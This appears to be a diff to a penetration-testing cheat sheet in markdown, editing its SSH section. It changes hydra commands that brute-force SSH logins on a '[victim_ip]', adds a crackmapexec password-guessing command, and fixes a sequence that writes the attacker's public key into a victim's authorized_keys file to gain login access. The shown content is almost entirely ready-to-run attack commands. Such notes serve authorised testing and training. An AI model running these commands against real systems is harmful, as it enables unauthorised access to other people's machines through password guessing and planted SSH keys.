@@ -581,8 +581,13 @@ run
 
 #### SSH data bruteforce with hydra
 ```
-hydra -v -V -l root -P password-file.txt [victim_ip] ssh
-hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
+hydra -v -V -l [user-name] -P password-file.txt [victim_ip] ssh
+hydra -v -V -L users-file.txt -P password-file.txt -t 16 [victim_ip] ssh
+```
+
+#### SSH data bruteforce with crackmapexec
+```
+crackmapexec ssh [victim_ip] -u [user_name] -p password-file.txt
 ```
 
 #### ssh keygen process
@@ -591,7 +596,7 @@ ssh-keygen
 mkdir /mnt/user_name/.ssh
 touch /mnt/user_name/.ssh/authorized_keys
 cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
-ssh use_name@[victim_ip
+ssh use_name@[victim_ip]
 ```
 
 #### usefull ssh exploits
